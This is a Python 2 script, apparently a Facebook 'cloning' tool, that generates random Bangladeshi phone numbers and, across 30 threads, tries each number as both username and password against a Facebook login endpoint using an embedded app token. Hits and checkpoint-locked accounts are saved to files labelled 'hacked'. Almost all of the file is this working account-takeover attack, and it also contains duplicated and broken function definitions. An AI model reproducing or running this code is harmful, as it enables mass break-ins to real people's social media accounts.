import os, sys, time, mechanize, itertools, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
from multiprocessing.pool import ThreadPool
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (J2ME/MIDP; Opera Mini/SymbianOS/22.478; U; en) Presto/2.5.25 Version/10.54')]
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (J2ME/MIDP; Opera Mini/SymbianOS/22.478; U; en) Presto/2.5.25 Version/10.54')]
os.system('clear')
done = False

def animate():
    for c in itertools.cycle(['\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa110%', '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa120%', '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa130%', '\x1b[1;94m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa140%', '\x1b[1;95m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa150%', '\x1b[1;96m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa160%', '\x1b[1;97m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa170%', '\x1b[1;92m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa180%', '\x1b[1;93m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa1\xe2\x96\xa190%', '\x1b[1;91m\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa0\xe2\x88\x9a100%']):
        if done:
            break
        sys.stdout.write('\r\x1b[1;93m               Loading ' + c)
        sys.stdout.flush()
        time.sleep(0.25)


t = threading.Thread(target=animate)
t.start()
time.sleep(2.5)
done = True

def keluar():
    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Back'
    os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '%s;' % str(31 + j))

    x += ''
    x = x.replace('!0', '')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(1e-05)


def keluar():
    print '\x1b[1;91mExit'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo1 = """
\033[1;91m##     ##\033[1;92m    ###\033[1;93m    ##     ##\033[1;94m    ###\033[1;95m    ########\033[1;96m  #### 
\033[1;91m###   ###\033[1;92m   ## ##\033[1;93m   ##     ##\033[1;94m   ## ##\033[1;95m   ##     ##\033[1;96m  ##  
\033[1;91m#### ####\033[1;92m  ##   ##\033[1;93m  ##     ##\033[1;94m  ##   ##\033[1;95m  ##     ##\033[1;96m  ##  
\033[1;91m## ### ##\033[1;92m ##     ##\033[1;93m #########\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m #########\033[1;93m ##     ##\033[1;94m #########\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ########\033[1;96m  ####
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;93m MAHADI HASAN AFRIDI
\033[1;94m FACEBOOK\033[1;94m :\033[1;96m MAHADI HASAN AFRIDI
\033[1;93m GITHIB\033[1;92m   : \033[1;91mMAHADI-143
\033[1;92m TOOLS  \033[1;93m  : \033[1;94mBD 11 DIGIT
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________"""
logo = """
\033[1;91m##     ##\033[1;92m    ###\033[1;93m    ##     ##\033[1;94m    ###\033[1;95m    ########\033[1;96m  #### 
\033[1;91m###   ###\033[1;92m   ## ##\033[1;93m   ##     ##\033[1;94m   ## ##\033[1;95m   ##     ##\033[1;96m  ##  
\033[1;91m#### ####\033[1;92m  ##   ##\033[1;93m  ##     ##\033[1;94m  ##   ##\033[1;95m  ##     ##\033[1;96m  ##  
\033[1;91m## ### ##\033[1;92m ##     ##\033[1;93m #########\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m #########\033[1;93m ##     ##\033[1;94m #########\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ########\033[1;96m  ####
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;93m MAHADI HASAN AFRIDI
\033[1;94m FACEBOOK\033[1;94m :\033[1;96m MAHADI HASAN AFRIDI
\033[1;93m GITHIB\033[1;92m   : \033[1;91mMAHADI-143
\033[1;92m TOOLS  \033[1;93m  : \033[1;94mBD 11 DIGIT
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________"""
os.system('clear')
print """\033[1;91m##     ##\033[1;92m    ###\033[1;93m    ##     ##\033[1;94m    ###\033[1;95m    ########\033[1;96m  #### 
\033[1;91m###   ###\033[1;92m   ## ##\033[1;93m   ##     ##\033[1;94m   ## ##\033[1;95m   ##     ##\033[1;96m  ##  
\033[1;91m#### ####\033[1;92m  ##   ##\033[1;93m  ##     ##\033[1;94m  ##   ##\033[1;95m  ##     ##\033[1;96m  ##  
\033[1;91m## ### ##\033[1;92m ##     ##\033[1;93m #########\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m #########\033[1;93m ##     ##\033[1;94m #########\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ########\033[1;96m  ####
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;93m MAHADI HASAN AFRIDI
\033[1;94m FACEBOOK\033[1;94m :\033[1;96m MAHADI HASAN AFRIDI
\033[1;93m GITHIB\033[1;92m   : \033[1;91mMAHADI-143
\033[1;92m TOOLS  \033[1;93m  : \033[1;94mBD 11 DIGIT
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________"""
jalan(' ')

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


os.system('clear')

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


os.system('clear')
jalan('\x1b[1;31m\x1b[1;96mdone\x1b[1;31m!')
os.system('clear')

def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
print logo1
print "[*] CONTACT ADMIN FIRST THAN TAKE THE TOKEN"
os.system('xdg-open https://wa.me/+8801794315166')
CorrectUsername = 'M4H4D1-H4S4N-4FR1D1-KING- BYPASS-XUDI-AMI-1'
loop = 'true'
loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m\x1b[1;93m[*] PUT YOUR PERSONAL TOKEN \x1b[1;95m: \x1b[1;94m")
    if (username == CorrectUsername):
            print "\033[1;97m[\xe2\x9c\x93] CORRECT YOUR PERSONAL TOKEN "
	    time.sleep(2)
            loop = 'false'
    else:
        print "\033[1;91m[*] WRONG TOKEN"
        os.system('xdg-open https://www.facebook.com/4FR1D1.143')


import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0)
        os.system('clear')
        
    os.system('clear')
    print """
\033[1;91m##     ##\033[1;92m    ###\033[1;93m    ##     ##\033[1;94m    ###\033[1;95m    ########\033[1;96m  #### 
\033[1;91m###   ###\033[1;92m   ## ##\033[1;93m   ##     ##\033[1;94m   ## ##\033[1;95m   ##     ##\033[1;96m  ##  
\033[1;91m#### ####\033[1;92m  ##   ##\033[1;93m  ##     ##\033[1;94m  ##   ##\033[1;95m  ##     ##\033[1;96m  ##  
\033[1;91m## ### ##\033[1;92m ##     ##\033[1;93m #########\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m #########\033[1;93m ##     ##\033[1;94m #########\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ########\033[1;96m  ####
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;93m MAHADI HASAN AFRIDI
\033[1;94m FACEBOOK\033[1;94m :\033[1;96m MAHADI HASAN AFRIDI
\033[1;93m GITHIB\033[1;92m   : \033[1;91mMAHADI-143
\033[1;92m TOOLS  \033[1;93m  : \033[1;94mBD 11 DIGIT
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________"""
    
    jalan('')


psb('')
for n in range(99000):
    nmbr = random.randint(11111111, 99999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0)


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


back = 0
successful = []
cpb = []
oks = []
id = []
os.system('clear')
os.system('clear')
print logo

def menu():
    jalan('\x1b[1;92m [1] \x1b[1;92mSTART CLONING\x1b[1;95m [\x1b[1;96mBD NUMBER\x1b[1;95m]\n\x1b[1;37m\x1b[1;97m [0] \x1b[1;37mEXIT  ')
    print '\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________'
    action()


def action():
    bch = raw_input(' Choose : ')
    if bch == '':
        os.system('clear')
        print '[!] sorry bro wrong input'
        action()
    elif bch == '1':
        os.system('clear')
        print"""
\033[1;91m##     ##\033[1;92m    ###\033[1;93m    ##     ##\033[1;94m    ###\033[1;95m    ########\033[1;96m  #### 
\033[1;91m###   ###\033[1;92m   ## ##\033[1;93m   ##     ##\033[1;94m   ## ##\033[1;95m   ##     ##\033[1;96m  ##  
\033[1;91m#### ####\033[1;92m  ##   ##\033[1;93m  ##     ##\033[1;94m  ##   ##\033[1;95m  ##     ##\033[1;96m  ##  
\033[1;91m## ### ##\033[1;92m ##     ##\033[1;93m #########\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m #########\033[1;93m ##     ##\033[1;94m #########\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ##     ##\033[1;96m  ##  
\033[1;91m##     ##\033[1;92m ##     ##\033[1;93m ##     ##\033[1;94m ##     ##\033[1;95m ########\033[1;96m  ####
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________

\033[1;91m DEVELOPER\033[1;92m:\033[1;93m MAHADI HASAN AFRIDI
\033[1;94m FACEBOOK\033[1;94m :\033[1;96m MAHADI HASAN AFRIDI
\033[1;93m GITHIB\033[1;92m   : \033[1;91mMAHADI-143
\033[1;92m TOOLS  \033[1;93m  : \033[1;94mBD 11 DIGIT
\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________"""
        print
        print('\x1b[1;91m [*]\x1b[1;91m \x1b[1;31mROBI BD SIM CODE : 018')
        print('\x1b[1;92m [*]\x1b[1;92m \x1b[1;32mAIRTEL BD SIM CODE : 016')
        print('\x1b[1;93m [*]\x1b[1;93m \x1b[1;33mBANGLALINK BD SIM CODE : 019/014 ')
        print('\x1b[1;94m [*]\x1b[1;94m \x1b[1;34mTELETALK BD SIM CODE : 015  ')
        print('\x1b[1;95m [*]\x1b[1;95m \x1b[1;35mGRAMEENPHONE BD SIM CODE : 017 ')
        try:
            c = raw_input('\x1b[1;96m \x1b[1;36m[+] PLEASE BD SIM CODE : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m018'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m016'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '4':
        os.system('clear')     
        os.system('')
    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m015'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m013'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '':
        os.system('clear')
        print logo
        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m014'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE  : ')
            k = '+88'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

        exb()
    else:
        print '[!] Fill in correctly'
        os.system('clear')
        action()
        os.system('clear')
    xxx = str(len(id))
    psb('\n [*] TOTAL ID NUMBER\x1b[1;32m : ' + xxx)

    time.sleep(0.5)
    psb('\x1b[1;96m')
    time.sleep(0.5)
    print '\033[1;95m__________\033[1;92m___________\033[1;95m___________\033[1;93m___________\033[1;95m___________'
    def main(arg):
        global cpb
        global oks
        user = arg
        try:
            os.mkdir('hacked by Mahadi')
        except OSError:
            pass

        try:
            result = k + c + user
            digi11 = result[3:14]
            pass1 = digi11
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
            	print '\x1b[1;92m[LOGIN AFTER 7 DAYS]\x1b[0m \n'
                print '\x1b[1;92m[MAHADI-OK] NUMBER \x1b[1;92m ' + k + c + user + '  '+' \n'
                print '\x1b[1;92m[MAHADI-OK] PASSWORD \x1b[1;92m ' + pass1 + '\x1b[1;92m \n'
                okb = open('Mahadi/hacked 100%successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
            	print '\x1b[1;91m[STATUS : ACCOUNT WITH APPROVAL LOCK]\x1b[0m \n'
                print '\x1b[1;92m[SOLUTION : CHECK YOUR ID AFTER 15 DAYS]\x1b[0m \n'
            	print '\x1b[1;93m[CLONING : ONLY DATA AND PLZ YOUR APN CHANGE]\x1b[0m \n'
            	print '\x1b[1;91m[NUMBER] - \x1b[1;91m ' + k + c + user + '  '+' \n'
                print '\x1b[1;94m[PASSWORD] - \x1b[1;94m ' + pass1 + '\x1b[1;94m \n'
                cps = open('mahadi/hacked 50%checkpoint.txt', 'a')
                cps.write(k + c + user + '|' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)


if __name__ == '__main__':
    menu()
